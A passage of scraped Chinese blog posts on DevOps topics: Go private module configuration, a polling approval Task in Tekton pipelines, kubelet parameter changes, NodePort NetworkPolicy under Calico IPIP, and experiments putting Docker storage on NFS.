[GIN-debug] GET / --\u0026gt; main.main.func1 (3 handlers) [GIN-debug] Environment variable PORT is undefined. Using port :8080 by default [GIN-debug] Listening and serving HTTP on :8080 编译 1 go build 推送到代码仓库 1 2 3 4 5 git init git remote add origin git@gitlab.private.com:shaowenchen/go-test.git git add . git commit -m \u0026#34;Initial commit\u0026#34; git push -u origin master 2. 如何拉取私有依赖包 使用 ssh 替换 https 如果私有仓库使用的是 SSH 鉴权，那么需要将 http/https 替换为 git@ 的形式。\n1 git config --global url.\u0026#34;git@gitlab.private.com:\u0026#34;.insteadof \u0026#34;https://gitlab.private.com/\u0026#34; 或者修改 ~/.gitconfig 添加如下内容:\n[url \u0026#34;git@gitlab.private.com:\u0026#34;] insteadof = https://gitlab.private.com/ 设置环境变量豁免私有仓库 Go Modules 默认使用代理去更新依赖，需要对私有仓库依赖包进行豁免。同时，没有 GOSUMDB 服务对私有依赖包进行校验，因此也需要豁免。\n1 2 3 go env -w GOPRIVATE=\u0026#34;gitlab.private.com\u0026#34; go env -w GONOPROXY=\u0026#34;gitlab.private.com\u0026#34; go env -w GONOSUMDB=\u0026#34;gitlab.private.com\u0026#34; 如果代码仓库服务器没有使用合法的证书，还需要配置如下环境变量:\n1 go env -w GOINSECURE=\u0026#34;gitlab.private.com\u0026#34; 添加一个新的依赖包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import ( \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;gitlab.private.com/share/log\u0026#34; ) func main() { r := gin.Default() r.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: \u0026#34;hello world.\u0026#34;, }) }) log.Info(\u0026#34;hello world\u0026#34;) r.Run() } 下载依赖包 1 2 3 go get \u0026#34;gitlab.private.com/share/log\u0026#34; go mod tidy go mod vendor 运行和编译 1 2 go run main.go go build 3. 替换无法下载的包 通常有两种情况会使用 replace 替代包:\n无法直接拉取，需要使用其他来源的镜像包 依赖的包，正在开发，尚未发布 1 2 3 4 5 6 7 8 go 1.16 require ( github.com/gin-gonic/gin v1.7.2 gitlab.private.com/share/log v0.0.4 ) replace gitlab.private.com/share/log v0.0.4 =\u0026gt; /module/path/log 或者\ngo mod edit -replace=gitlab.private.com/share/log@v0.0.4=/module/path/log 4. 如何自定义包的域名地址 通常添加依赖包的格式是 github.com/gin-gonic/gin，其中 github.com 就是代码服务器地址，gin-gonic 是组织名，gin 是项目名。\n但是，Kuberntes 中的包并不是 github.com/kubernetes/kubernetes ，而是 k8s.io/kubernetes，那么这是怎么实现的呢？\n这里需要对 k8s.io 进行重定向，以 github.com/gianarb/go-irc 替换为 go.gianarb.it/irc 使用 GitHub Pages 为例:\n创建一个项目 go-libraries 添加一个与项目同名的文件, irc , 内容如下: 1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;go-import\u0026#34; content=\u0026#34;go.gianarb.it/irc git https://github.com/gianarb/go-irc\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;https://github.com/gianarb/go-irc\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Redirecting you to the \u0026lt;a href=\u0026#34;https://github.com/gianarb/go-irc\u0026#34;\u0026gt;project page\u0026lt;/a\u0026gt;... \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将项目绑定到域名: go.gianarb.it\n使用 go get go.gianarb.it/irc 下载依赖包\n5. 常见问题 go mody tidy 时，SUM 校验错误 1 2 3 verifying gitlab.private.com/mygroup/proto@v0.0.1: checksum mismatch downloaded: h1:zpwTvQGgQFudfxFgnj9w90do3ps+BQ9ir/Sa7oVPooA= go.sum: h1:+XAvplGdXmvEank7sOI+Cd3GYdq3dBEDpW4/DO3sSUw= 解决办法:\n1 2 3 go clean -modcache rm go.sum go mod tidy 6. 参考 https://gianarb.it/blog/go-mod-vanity-url ","description":"","id":213,"section":"post","tags":["博文","Go","入门"],"title":"Go 私有包的构建和使用","uri":"https://www.chenshaowen.com/blog/building-and-using-go-private-packages.html"},{"content":"1. CICD 平台的基本功能 常见的 CICD 引擎并不适合直接提供给业务方使用。主要原因在于用户学习成本高、缺乏必要的鉴权、维护升级难度大。\n我们通常会基于流程引擎，针对业务进行适配提高易用性，针对场景进行封装收敛复杂度，那么一个 CICD 平台需要具备哪些基本的功能呢？\n流程编排。基本而又核心的功能，借助开源的编排引擎即可。 流程原子。流程原子组装得到流水线，越丰富的流程原子，越能够满足业务方的需求。 流程控制。主要包括条件执行、暂停、继续、审批等，允许控制流水线的行为。 自动触发。通过 API、Webhook 等方式自动触发流水线，会给使用方带来很大便利。 权限控制。作为一个面向用户的平台，权限控制必不可少。 Tekton 作为云原生下的 CICD 引擎，用来构建面向 Kubernetes 基础设施的 CICD 平台，非常适用。本篇主要想和大家分享的是 Tekton 流程控制，特别是审批的功能。\n2. Tekton 中的流程控制 2.1 runAfter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 - name: test-app taskRef: name: make-test resources: inputs: - name: workspace resource: my-repo - name: build-app taskRef: name: kaniko-build runAfter: - test-app resources: inputs: - name: workspace resource: my-repo 通过 runAfter 关键字可以控制任务的执行顺序，上面的示例中 build-app 会在 test-app 执行完成之后执行。使用 runAfter 可以实现对流程的编排。\n2.2 conditions 这里首先创建一个 Condition 对象，检查代码仓库中是否存在指定文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: tekton.dev/v1alpha1 kind: Condition metadata: name: file-exists spec: params: - name: \u0026#34;path\u0026#34; resources: - name: workspace type: git check: image: alpine script: \u0026#39;test -f $(resources.workspace.path)/$(params.path)\u0026#39; 在创建 Pipeline 时，只需要在 Task 中引用这个 Condition，提供必要的参数即可。下面这个例子中，仅当代码仓库中存在 README.md 文件时，my-task 任务才会执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 apiVersion: tekton.dev/v1beta1 kind: Pipeline metadata: name: conditional-pipeline spec: resources: - name: source-repo type: git params: - name: \u0026#34;path\u0026#34; default: \u0026#34;README.md\u0026#34; tasks: - name: if-condition-then-run conditions: - conditionRef: \u0026#34;file-exists\u0026#34; params: - name: \u0026#34;path\u0026#34; value: \u0026#34;$(params.path)\u0026#34; resources: - name: workspace resource: source-repo taskRef: name: my-task 2.3 PipelineRunCancelled 当 PipelineRun Spec 中的状态处于 PipelineRunCancelled 时，Reconciler 会提前取消全部 Task 并更新状态。\n参考代码: https://github.com/tektoncd/pipeline/blob/c8dc797cf5a6f11f90cb742d014470a444fcdc60/pkg/reconciler/pipelinerun/pipelinerun.go#L147\n查看正在运行的 pipelinerun 1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME cancel-pipelinerun-r-67qsr Unknown Running 51m 修改 pipelineruns 的 status 为 PipelineRunCancelled 1 kubectl patch PipelineRun cancel-pipelinerun-r-67qsr --type=merge -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;status\u0026#34;:\u0026#34;PipelineRunCancelled\u0026#34;}}\u0026#39; 查看取消的 pipelinerun 1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME cancel-pipelinerun-r-67qsr False PipelineRunCancelled 52m 3s 2.4 PipelineRunPending 除了上面的 PipelineRunCancelled 状态，pipelinerun 还有一个状态，PipelineRunPending。PipelineRunPending 实现的效果是，创建 PipelineRun 但不立即运行\n创建一条 PipelineRunPending 状态的流水线 1 2 3 4 5 6 7 8 9 10 11 12 13 14 --- apiVersion: tekton.dev/v1beta1 kind: PipelineRun metadata: name: pending-pipelinerun spec: params: - name: pl-param-x value: \u0026#34;100\u0026#34; - name: pl-param-y value: \u0026#34;500\u0026#34; pipelineRef: name: pending-pipeline status: \u0026#34;PipelineRunPending\u0026#34; 查看流水线状态 1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME pending-pipelinerun Unknown PipelineRunPending 这条流水线没有执行时间，因为它一直处于等待状态。\n移除 PipelineRunPending 状态 1 kubectl patch PipelineRun pending-pipelinerun --type=merge -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;status\u0026#34;:\u0026#34;\u0026#34;}}\u0026#39; 这条流水线开始执行。\n查看流水线状态 1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME pending-pipelinerun Unknown Running 4s 无法将正在运行的流水线修改为 PipelineRunPending 状态 在 Tekton v0.24.1 中无法修改状态为 PipelineRunPending，如果运行将可以实现暂停的效果。\n1 2 3 4 kubectl get pipelineruns.tekton.dev NAME SUCCEEDED REASON STARTTIME COMPLETIONTIME cancel-pipelinerun Unknown Running 9s 1 2 3 kubectl patch PipelineRun cancel-pipelinerun --type=merge -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;status\u0026#34;:\u0026#34;PipelineRunPending\u0026#34;}}\u0026#39; Error from server (BadRequest): admission webhook \u0026#34;validation.webhook.pipeline.tekton.dev\u0026#34; denied the request: validation failed: invalid value: PipelineRun cannot be Pending after it is started: spec.status validation 限制了这次修改操作。\n3. 如何实现审批功能 上面提到了 Tekton 中的几个流程控制方法，但是社区并没有提供、也不准备提供审批的功能。因此，在对 Tekton 进行二次开发时，需要 CICD 平台自行实现审批和权限的控制。下面是两种实现方案，以供参考：\n3.1 方案一，使用 Trigger 如上图，可以将用户的一条流水线拆解为两条流水线，pipeline-1/2 和 pipeline-2/2。两条流水线之间引入一个 trigger。\n当流水线 pipeline-1/2 执行完成时，通知审批者。 审批者审批通过后，触发 pipeline-2/2 执行。 pipeline-2/2 执行结束，完成整条流水线。 Tekton 社区提供了一个 triggers 组件，用来自动化触发流水线。如下图:\n审批之后，推送一个触发事件 Event EventController 收到这个事件之后，从 TriggerBinding 提取出事件内的参数 Parameters TriggerTemplate 利用传递过来的参数 Parameters，创建流水线 pipeline-2/2 。 3.2 方案二，开发一个审批 Task 开发 Task 是 Tekton 的主要扩展方式，同时开发 Task 只需要掌握基本的 Shell 和 Yaml 知识即可。这里提供另外一个思路就是开发一个审批 Task。\n如上图，在一条流水线中，插入一个用于审批控制的 Task-Approve。\n在使用审批原子时，需要同步创建一个 ConfigMap，用于保存审批的状态 Status=init 当流水线执行完成 Task-beforeApprove 任务时，启动 Task-Approve 任务，修改状态 Status=notifying。Task-Approve 任务一直处于等待状态。 发送通知给 Approver，修改状态 Status=notified 审批者审批流水线，允许执行，修改状态 Status=success Task-Approve 检测到 Status=success，立即结束等待状态，完成当前 Task 流水线继续执行审批后的任务 Task-afterApprove，直至结束 下面是一个示例:\n首先创建一个 ConfigMap 用于保存审批状态。\n1 2 3 4 5 6 apiVersion: v1 kind: ConfigMap metadata: name: approve-cm data: status: init 编写一个审批的 Task，默认等待 24 小时审批，否则超时。如果将状态修改为 success 则审批通过，如果将状态修改为 refused 则表示拒绝。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: approve-task spec: workspaces: - name: data params: - name: timeout description: The max seconds to approve type: string default: \u0026#34;86400\u0026#34; steps: - name: sleep-a-while image: bash:latest script: | #!/usr/bin/env bash end=$((SECONDS+$(params.timeout))) while [ $SECONDS -lt $end ]; do name=$(cat \u0026#34;$(workspaces.data.path)\u0026#34;/status) if [ \u0026#34;$name\u0026#34; = \u0026#34;success\u0026#34; ] then echo \u0026#34;approved!\u0026#34; exit 0 elif [ \u0026#34;$name\u0026#34; = \u0026#34;refused\u0026#34; ] then echo \u0026#34;refused!\u0026#34; exit 1 fi sleep 2 echo \u0026#34;waiting\u0026#34; done echo \u0026#34;too long not to approve\u0026#34; exit 1 然后，创建一个测试用例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 apiVersion: tekton.dev/v1beta1 kind: Task metadata: name: something annotations: description: | A simple task that do something spec: steps: - name: do-something image: bash:latest script: | #!/usr/bin/env bash uname -a --- apiVersion: tekton.dev/v1beta1 kind: Pipeline metadata: name: approve-pipeline spec: workspaces: - name: workspace tasks: - name: wait-for-approve workspaces: - name: data workspace: workspace taskRef: name: approve-task - name: do-something taskRef: name: something runAfter: - wait-for-approve --- apiVersion: tekton.dev/v1beta1 kind: PipelineRun metadata: name: approve-pipelinerun spec: workspaces: - name: workspace configmap: name: approve-cm pipelineRef: name: approve-pipeline 创建之后查看流水线 日志中会一直输出 waiting。\n审批通过 1 kubectl patch ConfigMap approve-cm --type=merge -p \u0026#39;{\u0026#34;data\u0026#34;:{\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;}}\u0026#39; 查看流水线状态 4. 总结 在进行 Tekton 二次开发时，审批是很难绕开的功能，但社区并没有提供相关的特性。本文首先介绍了 Tekton 中流程控制方法，然后提供了两种实现审批功能的方案。下面对方案进行简单的对比和总结:\n4.1 使用 Trigger 审批 优点\n灵活，审批之后的执行，完全由开发者控制，自由度更大。同时也可以使用后台任务替换 Trigger，使用 Tekton Client 创建流水线。 可靠，即使重启也不会影响审批。 缺点\n拆分之后可能不止两条流水线。 需要跨流水线传递参数、产物，增加了维护的成本。 架构复杂度增加，引入了新的组件、后台处理逻辑 4.2 开发一个审批 Task 优点\n使用简单。一条 Pipeline 只有一个 DAG，容易理解。 更加符合 Tekton 的扩展方式。 缺点\n审批 Task 因为节点故障失败时，无法恢复 占用集群资源，审批 Task 常驻集群等待。 ConfigMap 状态更新不及时，会有一个延时(默认在分钟级)，大约值为 kubelet 的同步周期加上 ConfigMap 在 kubelet 中缓存的 TTL 时间。可以参考文档 如何修改 Kubelet 的启动参数 修改。 5. 参考 https://kubernetes.io/zh/docs/tasks/configure-pod-container/configure-pod-configmap/ ","description":"","id":214,"section":"post","tags":["博文","Tekton","Kubernetes","CICD","DevOps"],"title":"在 Tekton 中如何实现审批功能","uri":"https://www.chenshaowen.com/blog/how-to-implement-approval-function-in-tekton.html"},{"content":"1. 编辑 Kubelet 配置文件 1 vim /etc/systemd/system/kubelet.service.d/10-kubeadm.conf 修改 Kubelet 相关参数\nExecStart=/usr/local/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS 可以通过如下命令查看可选的参数:\n1 kubelet --help 例如需要修改，KUBELET_KUBECONFIG_ARGS 的 --sync-frequency ， 同步容器配置的时钟周期，默认值是 1 min。其含义是，更新了容器挂载的配置文件 1 min 之后，容器才能感知到。\n2. 重启 Kubelet 服务 1 2 3 systemctl stop kubelet systemctl daemon-reload systemctl start kubelet 3. 查看 Kubelet 相关进程 使用如下命令，可以看到相关的启动参数\n1 ps -ef | grep kubelet ","description":"","id":215,"section":"post","tags":["博文","Kubernetes","Kubelet"],"title":"如何修改 Kubelet 的启动参数","uri":"https://www.chenshaowen.com/blog/how-to-change-kubelet-config.html"},{"content":"1. 需求背景 如上图，业务方需要隔离 namespae 的服务，禁止 bar 空间的负载访问，而允许用户从 Load Balancer (LB) 通过 NodePort 访问服务。可以很容易地写出一个网络策略:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-network-policy namespace: foo spec: podSelector: matchLabels: {} policyTypes: - Ingress ingress: - from: - ipBlock: cidr: 10.2.3.4/32 - namespaceSelector: matchExpressions: - key: region operator: NotIn values: - bar 然而从 LB 访问的流量被完全禁止，不符合预期。在技术社区检索得到的答案可能是，Kubernetes NetworkPolicy 主要针对的是集群内的访问策略，而外部流量经过 SNAT 之后，IP 发生变化无法命中策略。\n不同的网络插件，使用不同的模式，配置会有差异。本文仅提供一个思路，以常见的 Calico IPIP 模式为例配置 NodePort 的流量访问策略。\n2. 预备知识点 2.1 Kubernetes 中的 NetworkPolicy 在文档 Kubernetes 之网络隔离(内附十多种使用场景) 中，我对 Kubernetes 的 NetworkPolicy 有所描述，给出了很多示例。\nNetworkPolicy 是 Kubernetes 中的网络隔离对象，用来描述网络隔离策略，具体实现依赖于网络插件。目前，Calico、Cilium、Weave Net 等网络插件都支持网络隔离功能。\n2.2 Calico 的几种工作模式 BGP 模式 在 BGP 模式下，集群中的 BGP 客户端两两互联，同步路由信息。\nRoute Reflector 模式 在 BGP 模式下，客户端连接数量达到 N * (N - 1)，N 表示节点的数量。这种方式限制了节点的规模，社区建议不超过 100 个节点。\nRoute Reflector 模式下，BGP 客户端不需要两两同步路由信息，而是将路由信息同步到若干指定的 Route Reflector 。全部 BGP 客户端只需要和 Route Reflector 建立连接即可，连接数量与节点数量线性相关。\nIPIP 模式 不同于 BGP 模式，IPIP 模式是通过 tunl0 在节点之间建立隧道，实现网络连通。下图描述了 IPIP 模式下 Pod 之间的流量。\n3. 为什么网络策略不生效 在前面的文档 Kubernetes 中如何获取客户端真实 IP 中，我描述过 externalTrafficPolicy 对服务流量的影响。\nCluster 模式下，如果访问 node-2:nodeport，流量将被转发到有服务 Pod 的节点 node-1 上。\nLocal 模式下，如果访问的 node-2:nodeport，流量不会被转发，无法响应请求。\n通常我们默认采用的是 Cluster 模式，而 Cluster 模式在转发流量时会进行 SNAT，也就是修改源地址。这会导致访问请求无法命中网络策略，误以为网络策略没有生效。\n这里尝试两种解决办法:\n将 SNAT 之后的源地址也添加到访问白名单中 使用 Local 模式。由于 LB 有探活的功能，能将流量转发到具有服务 Pod 的节点上，从而保留了源地址。 4. NodePort 下的 NetworkPolicy 配置 4.1 测试环境 Kubernetes 版本 v1.19.8\nkube-proxy 转发模式 IPVS\n节点信息 1 2 3 4 5 6 kubectl get node -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME node1 Ready master,worker 34d v1.19.8 10.102.123.117 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1127.el7.x86_64 docker://20.10.6 node2 Ready worker 34d v1.19.8 10.102.123.104 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1127.el7.x86_64 docker://20.10.6 node3 Ready worker 34d v1.19.8 10.102.123.143 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1127.el7.x86_64 docker://20.10.6 测试的负载 1 2 3 4 kubectl -n tekton-pipelines get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES tekton-dashboard-75c65d785b-xbgk6 1/1 Running 0 14h 10.233.96.32 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 负载运行在 node2 节点上\n测试的服务 1 2 3 4 kubectl -n tekton-pipelines get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE tekton-dashboard NodePort 10.233.5.155 \u0026lt;none\u0026gt; 9097:31602/TCP 10m 4.2 NodePort 流量如何转发到 Pod 这里主要考虑两种情况。\n访问不存在 Pod 负载的节点 node1 服务转发规则 ipvsadm -L TCP node1:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP node1:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP node1.cluster.local:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP node1:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP localhost:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 可以看到访问 node1:31602 的流量被转发到了 10.233.96.32:9097，也就是服务 Pod 的 IP 地址和端口。\nIP 路由转发规则 接着看路由转发规则，10.233.96.0/24 网段的访问都会被转到 tunl0，经过隧道到达 node2 再转到服务中。\n1 2 3 4 5 6 route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.233.92.0 node3.cluster.l 255.255.255.0 UG 0 0 0 tunl0 10.233.96.0 node2.cluster.l 255.255.255.0 UG 0 0 0 tunl0 访问存在 Pod 负载的节点 node2 服务转发规则 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ipvsadm -L TCP node2:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP node2:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP node2.cluster.local:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 1 TCP node2:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 TCP localhost:31602 rr -\u0026gt; 10.233.96.32:9097 Masq 1 0 0 与 node1 一样，访问 node2 上的 NodePort 服务也会被转发到服务 Pod 的 IP 地址和端口上。\n路由转发规则 但是路由规则不一样，目的地址为 10.233.96.32 的包会发给 cali73daeaf4b12 。而 cali73daeaf4b12 与 Pod 中的网卡构成一组 veth pair，流量会被直接发往服务 Pod 中。\n1 2 3 4 5 6 7 route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.233.90.0 node1.cluster.l 255.255.255.0 UG 0 0 0 tunl0 10.233.92.0 node3.cluster.l 255.255.255.0 UG 0 0 0 tunl0 10.233.96.32 0.0.0.0 255.255.255.255 UH 0 0 0 cali73daeaf4b12 从上面命令返回可以知道，如果访问不存在 Pod 负载的节点，流量会经过 tunl0 转发；如果访问存在 Pod 负载的节点，流量不经过 tunl0 直接被路由到 Pod 中。\n4.3 方案一，将 tunl0 添加到网络策略白名单 查看各个节点的 tunl0 信息 node1\n1 2 3 4 ifconfig tunl0: flags=193\u0026lt;UP,RUNNING,NOARP\u0026gt; mtu 1440 inet 10.233.90.0 netmask 255.255.255.255 node2\n1 2 3 4 ifconfig tunl0: flags=193\u0026lt;UP,RUNNING,NOARP\u0026gt; mtu 1440 inet 10.233.96.0 netmask 255.255.255.255 node3\n1 2 3 4 ifconfig tunl0: flags=193\u0026lt;UP,RUNNING,NOARP\u0026gt; mtu 1440 inet 10.233.92.0 netmask 255.255.255.255 网络策略配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-network-policy namespace: foo spec: podSelector: matchLabels: {} policyTypes: - Ingress ingress: - from: - ipBlock: cidr: 10.2.3.4/32 - ipBlock: cidr: 10.233.90.0/32 - ipBlock: cidr: 10.233.96.0/32 - ipBlock: cidr: 10.233.92.0/32 - namespaceSelector: matchExpressions: - key: region operator: NotIn values: - bar 测试验证 不符合预期。全部经过 tunl0 的流量都会被允许。bar 命名空间的负载可以通过访问 node1:31602、node3:31602、tekton-dashboard.tekton-pipelines.svc:9097(非 node2 上的负载) 访问服务，无法对流量进行限制。\n4.4 方案二，使用 Local 模式 修改 svc 的 externalTrafficPolicy 为 Local 模式 1 2 3 4 5 6 7 8 9 10 11 kubectl -n tekton-pipelines get svc tekton-dashboard -o yaml apiVersion: v1 kind: Service metadata: name: tekton-dashboard namespace: tekton-pipelines spec: clusterIP: 10.233.5.155 externalTrafficPolicy: Local ... 拒绝全部入口流量 1 2 3 4 5 6 7 8 9 kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: test-network-policy-deny-all namespace: foo spec: podSelector: matchLabels: {} ingress: [] 添加访问白名单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-network-policy namespace: foo spec: podSelector: matchLabels: {} policyTypes: - Ingress ingress: - from: - ipBlock: cidr: 10.2.3.4/32 测试验证 符合预期。使用上面的网络策略，可以满足业务需求，屏蔽 bar 命名空间的访问，允许外部通过 LB 转发到 NodePort 的访问。\n5. 总结 网络是 Kuberntes 中相对难以掌握的部分，但网络又是对业务影响范围比较大、影响程度比较深远的一个方面。因此，多花一点时间在网络上，是必要而值得的。\n本文主要结合业务需求，对 Calico 的网络模式进行了更进一步的阐述，解决了因为 SNAT 导致源 IP 发生变化，最终 NetworkPolicy 不符合预期的问题。\n在 Calico 的 IPIP 模式下，针对 NodePort 的访问策略需要使用 externalTrafficPolicy: Local 流量转发模式。再结合网络策略最佳实践，先禁用全部流量之后，添加白名单策略。\n6. 参考 https://kubernetes.io/zh/docs/tutorials/services/source-ip/ https://github.com/antrea-io/antrea/issues/280 https://system51.github.io/2020/05/27/using-calico/ ","description":"","id":216,"section":"post","tags":["博文","NetworkPolicy","网络","Kubernetes"],"title":"在 Kubernetes 中如何给 NodePort 配置 NetworkPolicy","uri":"https://www.chenshaowen.com/blog/how-to-configure-networkpolicy-for-nodeport.html"},{"content":" 不能\n1. 问题背景 基于 Kubernetes 构建可靠、稳定的运维系统时，虚拟机 (VM) 的销毁和新建是一种常态。VM 提供的是计算和内存资源，而使用外部存储，通过 StorageClass 提供给集群中的 PVC 消费。\n在这样的背景下，如何快速初始化 VM 成为新的挑战。常见的思路是制作 Node 节点的 VM 镜像，提前将依赖下载、安装到 VM。添加 Node 节点时，利用预制的镜像，快速添加节点。\n但这种方式主要解决的集群扩容，而不能解决镜像冷下载问题。节点能快速添加，但是服务并不能快速启动，需要等待镜像下载完成。\n本文尝试提供一种新的方法，将 /var/lib/docker 挂载到外部存储，可以在不同主机之前迁移、共享。如果可行，将缩短集群扩缩容之后，服务迁移的时间。下面是示意图:\n另一种思路是，利用 Serverless 弹性、免运维的特性，将其计算能力通过 Virtual Kubelet 接入 Kubernetes 中。这样可以绕过 VM 维护的问题，在此不做论述。\n2. 搭建 NFS 服务器 搭建 NFS 服务 参考文档: CentOS 搭建 NFS 服务\n这里的 NFS Server 搭建在 dev.chenshaowen.com 上，/etc/exports 内容如下:\n/data/ *(rw,sync,no_root_squash,no_all_squash) 在 NFS Server 上，创建用于测试的目录 1 2 3 mkdir /data/docker mkdir /data/image mkdir /data/overlay2 在 VM 上，安装客户端工具 在使用 NFS 存储服务的 VM 上需要安装。\n1 yum install -y nfs-utils 在 VM 上，测试 NFS 服务 1 2 3 4 showmount -e dev.chenshaowen.com Export list for dev.chenshaowen.com: /data * 3. 测试一: 直接挂载 /var/lib/docker 以下全部操作，都是在 VM 上进行。\n创建本地目录 1 mkdir /root/docker 挂载远程目录 1 mount -t nfs dev.chenshaowen.com:/data/docker /root/docker 创建软链接 1 ln -s /root/docker /var/lib/docker 启动 Docker Daemon 1 systemctl start docker 拉取镜像 1 2 3 4 5 6 7 docker pull docker.io/alpine Using default tag: latest Trying to pull repository docker.io/library/alpine ... latest: Pulling from docker.io/library/alpine Digest: sha256:234cb88d3020898631af0ccbbcca9a66ae7306ecd30c9720690858c1b007d2a0 Status: Image is up to date for docker.io/alpine:latest 查看镜像 1 2 3 4 docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/alpine latest d4ff818577bc 5 days ago 5.6 MB 创建容器 1 2 3 4 docker run --rm -it alpine bash /usr/bin/docker-current: Error response from daemon: error creating overlay mount to /root/docker/overlay2/aa71f5e73c816ff6d58b9116e67b51c5d4fb7490e990940f8b7c2198d20f5bfe-init/merged: invalid argument. See \u0026#39;/usr/bin/docker-current run --help\u0026#39;. 清理测试环境 1 systemctl stop docker 1 umount /root/docker 如果无法卸载可以加 -f 参数强制卸载，或者使用 fuser /root/docker 查看使用的进程，强制 kill 。\n1 unlink /var/lib/docker 1 systemctl start docker 小结 直接挂载 /var/lib/docker 能下载、查看镜像，但是无法创建容器。\n4. 测试二: 挂载 /var/lib/docker/image 暂停 Docker Daemon 1 systemctl stop docker 创建本地目录 1 2 mkdir /root/image mkdir /var/lib/docker 挂载远程目录 1 mount -t nfs dev.chenshaowen.com:/data/image /root/image 创建软链接 1 ln -s /root/image /var/lib/docker/image 启动 Docker Daemon 1 systemctl start docker 拉取镜像、创建容器 1 2 3 4 5 6 docker pull nginx docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/nginx latest d1a364dc548d 3 weeks ago 133 MB 1 2 docker run --rm -it nginx bash root@401c782dcd46:/# 清理环境 1 systemctl stop docker 1 rm -rf /var/lib/docker/* 1 umount /root/image 小结 挂载 /var/lib/docker/image 可以正常使用，能拉取镜像、创建容器。但是，在另外一个 VM 中，查看磁盘占用:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 du -h --max-depth=1 /var/lib/docker 4.0K\t/var/lib/docker/runtimes 18G\t/var/lib/docker/overlay2 4.0K\t/var/lib/docker/swarm 4.0K\t/var/lib/docker/tmp 24M\t/var/lib/docker/image 88K\t/var/lib/docker/buildkit 212K\t/var/lib/docker/network 4.0K\t/var/lib/docker/trust 16K\t/var/lib/docker/plugins 28K\t/var/lib/docker/volumes 62M\t/var/lib/docker/containers 18G\t/var/lib/docker 实际上 /var/lib/docker/image 占用磁盘并不多，存储的是镜像的元数据，而真实数据在 /var/lib/docker/overlay2 中。当 /var/lib/docker/overlay2 数据丢失时，挂载的数据无法使用。\n同时，/var/lib/docker/image 无法多个 VM 共享，也就失去了加速的意义。\n5. 测试三: 挂载 /var/lib/docker/overlay2 暂停 Docker Daemon 1 systemctl stop docker 创建本地目录 1 mkdir /root/overlay2 挂载远程目录 1 mount -t nfs dev.chenshaowen.com:/data/overlay2 /root/overlay2 创建软链接 1 ln -s /root/overlay2 /var/lib/docker/overlay2 启动 Docker Daemon 1 systemctl start docker 测试 1 2 3 4 5 6 7 8 docker pull alpine Using default tag: latest Trying to pull repository docker.io/library/alpine ... latest: Pulling from docker.io/library/alpine 5843afab3874: Extracting [==================================================\u0026gt;] 2.811 MB/2.811 MB latest: Pulling from 